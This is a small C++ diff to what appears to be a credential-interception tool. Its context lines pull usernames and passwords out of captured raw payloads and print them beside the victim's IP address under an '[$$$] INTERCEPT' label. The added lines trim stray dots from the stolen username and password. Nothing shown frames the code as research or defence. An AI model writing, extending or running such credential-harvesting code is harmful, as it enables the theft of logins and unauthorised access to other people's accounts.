@@ -382,6 +382,15 @@ int main() {
                                             if (pass_str_pos != std::string::npos) {
                                                 ext_pass = raw_payload_str.substr(pass_str_pos + 10);
                                             }
+					    auto trim_dots = [](std::string& str) {
+    str.erase(0, str.find_first_not_of('.'));
+    if (!str.empty()) {
+        str.erase(str.find_last_not_of('.') + 1);
+    }
+};
+
+trim_dots(ext_user);
+trim_dots(ext_pass);
 
                                             std::cout << "[$$$] INTERCEPT: " << session.ip_address << " | User: " << ext_user << " | Pass: " << ext_pass << std::endl;
                                             
